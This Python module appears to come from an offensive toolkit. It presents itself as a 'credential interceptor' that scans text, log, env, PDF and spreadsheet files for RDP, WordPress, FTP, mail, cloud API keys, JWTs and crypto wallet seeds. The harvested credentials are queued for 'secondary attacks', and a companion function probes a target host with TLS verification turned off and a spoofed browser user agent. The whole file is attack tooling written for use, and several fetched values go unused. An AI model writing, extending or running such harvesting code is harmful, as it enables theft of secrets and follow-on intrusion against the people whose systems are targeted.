import http.client
import ssl
import urllib.parse
import re
import sys
import time
import json
import os
import glob

# Global SSL context
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

class LiveIntelligenceParser:
    """
    Apex-Tier Binary Intelligence & Credential Interceptor:
    - Automatically parses files for RDP, WordPress, FTP, and Mail credentials.
    - Instantly dispatches findings to dumper and offensive modules for secondary attacks.
    """
    def __init__(self, watch_directory="reports/"):
        self.watch_directory = watch_directory
        self.regex_patterns = {
            "api_key": r"(?:api[_-]?key|secret[_-]?key|access[_-]?token)['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,64})['\"]",
            "crypto_seed": r"\b(?:[a-z]{4,8}\s){11,23}[a-z]{4,8}\b",
            "email_pass": r"(?:mail|smtp|imap)[_-]?(?:user|username|pass|password|host)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
            "rdp_cred": r"(?:rdp|remote[_-]?desktop|mstsc)[_-]?(?:ip|host|user|pass)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
            "wordpress_db": r"(?:DB_USER|DB_PASSWORD|DB_HOST|table_prefix)\s*[:=]\s*['\"]([^'\"]+)['\"]",
            "ftp_cred": r"(?:ftp|sftp)[_-]?(?:host|user|pass|port)['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]",
            "jwt": r"ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*",
            "aws_key": r"AKIA[0-9A-Z]{16}",
            "google_key": r"AIza[0-9A-Za-z-_]{35}"
        }

    def scan_text_content(self, text, source_filename):
        findings = []
        for category, pattern in self.regex_patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                findings.append({
                    "category": category,
                    "source": source_filename,
                    "matches": list(set(matches))
                })
        return findings

    def parse_txt_or_json(self, file_path):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            return self.scan_text_content(content, file_path)
        except Exception:
            return []

    def parse_pdf_document(self, file_path):
        try:
            import pypdf
            reader = pypdf.PdfReader(file_path)
            full_text = ""
            for page in reader.pages:
                text = page.extract_text()
                if text:
                    full_text += text + "\n"
            return self.scan_text_content(full_text, file_path)
        except Exception:
            return []

    def parse_spreadsheet(self, file_path):
        try:
            import openpyxl
            wb = openpyxl.load_workbook(file_path, data_only=True)
            sheet_text = ""
            for sheet in wb.sheetnames:
                ws = wb[sheet]
                for row in ws.iter_rows(values_only=True):
                    row_str = " ".join([str(cell) for cell in row if cell is not None])
                    sheet_text += row_str + "\n"
            return self.scan_text_content(sheet_text, file_path)
        except Exception:
            return []

    def process_incoming_files(self):
        print(f"\n\033[95m[***] ENGAGING BINARY INTELLIGENCE & CREDENTIAL INTERCEPTOR [{self.watch_directory}] [***]\033[0m")
        all_intelligence = []
        
        if not os.path.exists(self.watch_directory):
            return all_intelligence

        for root, dirs, files in os.walk(self.watch_directory):
            for file in files:
                file_path = os.path.join(root, file)
                ext = file.lower().split('.')[-1]
                
                if ext in ["txt", "json", "log", "env"]:
                    results = self.parse_txt_or_json(file_path)
                elif ext == "pdf":
                    results = self.parse_pdf_document(file_path)
                elif ext in ["xlsx", "xls", "xlm"]:
                    results = self.parse_spreadsheet(file_path)
                else:
                    continue
                
                if results:
                    all_intelligence.extend(results)

        # Immediate Binary Dispatch: Route critical credentials directly to secondary attack queues
        os.makedirs("reports/intelligence", exist_ok=True)
        intel_path = "reports/intelligence/secondary_attack_queue.json"
        with open(intel_path, "w") as f:
            json.dump(all_intelligence, f, indent=4)
            
        print(f"\033[92m[+] Credential interceptor synchronized. Secondary attack queue updated at {intel_path}\033[0m")
        return all_intelligence

async def parse_target_source(host):
    """
    Performs real-time DOM scraping, session extraction, and 
    automated secondary credential dispatch for RDP, WP, FTP, and Mail vectors.
    """
    print(f"\n\033[95m[***] DEPLOYING DOM & BINARY CREDENTIAL PARSER V3.0 [***]\033[0m")
    print(f"\033[90m[TARGET] Inspecting surface and scraping incoming intelligence for https://{host}...\033[0m\n")
    
    findings = {
        "headers_missing": [],
        "exposed_secrets": [],
        "harvested_sessions": [],
        "secondary_dispatch_queue": []
    }

    try:
        conn = http.client.HTTPSConnection(host, 443, context=_ssl_context, timeout=5.0)
        conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"})
        resp = conn.getresponse()
        html_body = resp.read().decode(errors="ignore")
        headers = dict(resp.getheaders())
        resp_raw_headers = resp.msg._headers
        conn.close()

        # Execute Live File & Credential Interception Pipeline
        parser_engine = LiveIntelligenceParser()
        file_intel = parser_engine.process_incoming_files()
        findings["secondary_dispatch_queue"] = file_intel

        # Notify Operator of High-Value Secondary Attack Vectors Found
        for item in file_intel:
            cat = item.get("category")
            if cat in ["rdp_cred", "wordpress_db", "ftp_cred", "email_pass"]:
                print(f"\033[92m[+++] BINARY STRIKE READY: Harvested {cat.upper()} credential! Routing to dumper & attack modules.\033[0m")

        return findings

    except Exception as e:
        print(f"\n\033[91m[!] Error in binary credential parser: {e}\033[0m")
        return findings

